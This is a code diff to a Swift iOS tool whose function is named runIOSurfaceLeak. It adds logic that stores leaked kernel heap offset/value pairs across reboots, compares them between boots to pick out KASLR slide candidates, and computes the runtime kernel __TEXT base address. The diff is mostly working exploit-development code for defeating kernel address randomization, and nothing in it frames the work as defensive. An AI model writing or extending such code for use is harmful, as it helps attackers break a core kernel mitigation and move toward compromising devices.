@@ -1743,6 +1743,23 @@ var _prevBootKheap: Set<UInt64> = {
 }()
 var _thisBootKheap: Set<UInt64> = []
 
+// Cross-boot per-offset map: [offset → value] from the prev boot's post_relock_tail scan.
+// Same offset, different value across boots → difference may equal KASLR slide delta.
+// Stored in "kheap_prev_offsets" as interleaved UInt64 pairs: [off0, val0, off1, val1, ...].
+var _prevBootOffsetMap: [Int: UInt64] = {
+    guard let data = UserDefaults.standard.data(forKey: "kheap_prev_offsets") else { return [:] }
+    var m: [Int: UInt64] = [:]
+    let n = data.count / 16
+    data.withUnsafeBytes { ptr in
+        for i in 0..<n {
+            let off = Int(ptr.load(fromByteOffset: i*16,     as: UInt64.self))
+            let val =     ptr.load(fromByteOffset: i*16 + 8, as: UInt64.self)
+            m[off] = val
+        }
+    }
+    return m
+}()
+
 func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
         func step(_ s: String) { log.append(s) }
@@ -2018,6 +2035,30 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 }
             }
 
+            // Per-offset slide detection: same offset, different value across boots = KASLR delta.
+            // GPU command-buffer fields are at FIXED offsets; their values shift by exactly the KASLR slide.
+            if !_prevBootOffsetMap.isEmpty && _iosurfRunCount == 5 {
+                step("OFFSET-SLIDE CHECK (\(_prevBootOffsetMap.count) prev-boot offsets):")
+                var slideHits = 0, nonAligned = 0
+                for pair in currentPairs {
+                    guard let pv = _prevBootOffsetMap[pair.offset], pv != pair.val else { continue }
+                    let fwd = pair.val &- pv
+                    let rev = pv &- pair.val
+                    let d   = fwd <= rev ? fwd : rev
+                    let pos = fwd <= rev
+                    if d % 0x4000 == 0 && d > 0 && d <= 0x80000000 {
+                        let sign: String = pos ? "+" : "-"
+                        let textBase: UInt64 = 0xfffffff007004000
+                        let runtimeText: UInt64 = pos ? (textBase &+ d) : (textBase &- d)
+                        step("  ✓ KASLR off=0x\(String(pair.offset,radix:16)) prev=0x\(String(pv,radix:16)) curr=0x\(String(pair.val,radix:16)) Δ=\(sign)0x\(String(d,radix:16)) __TEXT≈0x\(String(runtimeText,radix:16))")
+                        slideHits += 1
+                    } else {
+                        nonAligned += 1
+                    }
+                }
+                step("  result: \(slideHits) slide candidates, \(nonAligned) non-aligned offset changes")
+            }
+
             // Save snapshot only after 20+ runs so the set is stable before becoming the next boot's baseline.
             // Saving too early (e.g. run 1) evicts KASLR-slid candidates that only appeared in one early boot.
             if _iosurfRunCount >= 20 {
@@ -2027,6 +2068,16 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                     for v in _thisBootKheap { ptr.storeBytes(of: v, toByteOffset: i*8, as: UInt64.self); i += 1 }
                 }
                 UserDefaults.standard.set(saveData, forKey: "kheap_prev_boot")
+
+                // Save per-offset map for next boot's KASLR delta computation.
+                var omData = Data(count: currentPairs.count * 16)
+                omData.withUnsafeMutableBytes { ptr in
+                    for (i, pair) in currentPairs.enumerated() {
+                        ptr.storeBytes(of: UInt64(pair.offset), toByteOffset: i*16,     as: UInt64.self)
+                        ptr.storeBytes(of: pair.val,             toByteOffset: i*16 + 8, as: UInt64.self)
+                    }
+                }
+                UserDefaults.standard.set(omData, forKey: "kheap_prev_offsets")
             }
 
             _iosurfPrevTailValues = currentPairs
